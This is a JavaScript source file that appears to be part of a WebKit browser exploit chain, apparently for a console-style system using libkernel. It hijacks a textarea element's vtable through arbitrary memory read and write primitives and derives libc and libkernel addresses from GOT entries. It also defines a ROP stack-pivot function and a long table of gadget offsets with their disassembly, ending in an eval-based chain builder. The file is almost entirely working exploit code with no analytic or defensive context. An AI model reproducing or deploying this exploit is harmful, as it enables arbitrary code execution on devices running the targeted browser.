var tarea = document.createElement('textarea');

var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);

var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

function get_got_addr(idx)
{
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry "+idx;
    var offset = 0;
    for(var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

//these are not real bases but rather some low addresses
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705)-0x10000;
var libc_base = get_got_addr(582);
var saveall_addr = libc_base+0x2e2c8;
var loadall_addr = libc_base+0x3275c;
var setjmp_addr = libc_base+0xbfae0;
var longjmp_addr = libc_base+0xbfb30;
var pivot_addr = libc_base+0x327d2;
var infloop_addr = libc_base+0x447a0;
var jop_frame_addr = libc_base+0x715d0;
var get_errno_addr_addr = libkernel_base+0x9ff0;
var pthread_create_addr = libkernel_base+0xf980;

function saveall()
{
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
    tarea.scrollLeft = 0;
    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr+0x38, buf);
    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
    write_ptr_at(buf, ans);
    tarea.scrollLeft = 0;
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}

/* FUNCIONES
w+1838146   //add rax, rcx
l+547636    //add rax, rsi
w+5202439   //and rax, rcx
w+14959219  //cmp rax, rcx ; sete al
w+11676600  //cmp rax, rsi ; sete al
w+1506828   //imul rax, rcx
w+865136    //mov [rax], cl
w+954100    //mov [rax], ecx
w+2997875   //mov [rax], rcx
w+14461559  //mov [rax], rdi
w+8975893   //mov [rdi + 0x1;0], r8
w+1026352   //mov [rdi + 0x1;0], r9
l+562536    //mov [rdi], cx
l+471355    //mov [rdi], rax
w+7438103   //mov [rsi], rax
l+270096    //mov al, [rdi]
l+270800    //mov ax, [rdi]
l+191169    //mov eax, [rdi]
l+186490    //mov rax, [rax]
l+191168    //mov rax, [rdi]
w+1786005   //mov rax, r11
l+759626    //mov rax, r8
l+882884    //mov rax, rcx
l+50775     //mov rax, rdi
l+877877    //mov rax, rdx
l+272260    //mov rax, rsi
l+547950    //mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
l+785097    //mov rsp, rbp ; pop rbp
w+6227286   //movsxd rax, edi
l+269973    //movzx eax, al
l+11        //nop
w+75236     //or rax, rcx
w+3750700   //pop r11 ; mov rax, rdi
w+432898    //pop r8
w+10235455  //pop r9
l+788575    //pop rax
l+792472    //pop rcx
l+206806    //pop rdi
w+105267    //pop rdx
l+793877    //pop rsi
l+811575    //pop rsp
l+523896    //sar edi, cl
w+48555     //setl al
w+8824269   //setle al
l+389047    //setne al
w+414627    //shl rax, 3
l+877546    //shl rax, cl
l+877568    //shr rax, cl
l+877175    //sub rax, rcx ; sbb rdx, rcx
l+248252    //sub rdi, rsi ; mov rdx, rdi
l+785193    //xor rax, rax
l+582033    //xor rax, rcx
l+785347    //cqo ; idiv rsi */
_4GB=4294967296;
l=libc_base;
w=webkit_base;
a=l+788575;
b=w+14461559;
c=l+793877;
d=l+248252;
e=l+471355;
f=l+811575;
g=l+882884;
h=w+7438103;
i=l+759626;
j=l+50775;
k=w+432898;
m=l+547636;
n=l+206806;
o=l+270800;
p=w+3750700;
q=l+792472;
s=l+877546;
t=l+523896;
u=w+1786005;
v=w+6227286;
x=l+877568;
y=l+191168;
z=w+75236;
A=l+191169;
B=w+5202439;
C=w+2997875;
D=w+954100;
E=w+14959219;
F=l+269973;
G=w+11676600;
H=l+186490;
I=l+877175;
J=w+1838146;
K=l+270096;
L=w+865136;
M=w+1506828;
N=l+272260;
O=l+877877;
P=w+8975893;
Q=w+1026352;
R=l+785097;
S=w+8824269;
T=l+389047;
U=w+414627;
V=w+105267;
W=w+10235455;
X=l+11;
Y=l+785193;
Z=l+582033;
a0=w+48555;
a1=l+785347;
a2=l+562536;
a3=w+11349202;
a4=w+11924577;
a5=w+2810902;
a6=l+547950;
function init(len){
	eval("r_array=new Uint32Array("+len+");r=read_ptr_at(addrof(r_array)+0x10);r_offset=2;function g(val){r_array[r_offset++]=val|0;r_array[r_offset++]=(val/_4GB)|0;}function gs(l){for(i=0;i<l.length;i++)g(l[i]);}function db(data){for(i=0;i<data.length;i++)r_array[r_offset++]=data[i];}main_ret=malloc(8);printf_buf=malloc(65536);__swbuf_addr=0;function d(v){r_array[r_offset++] = (v<0)?_4GB-v:v;r_array[r_offset++] = (v<0)?_4GB-1:0;}");
}
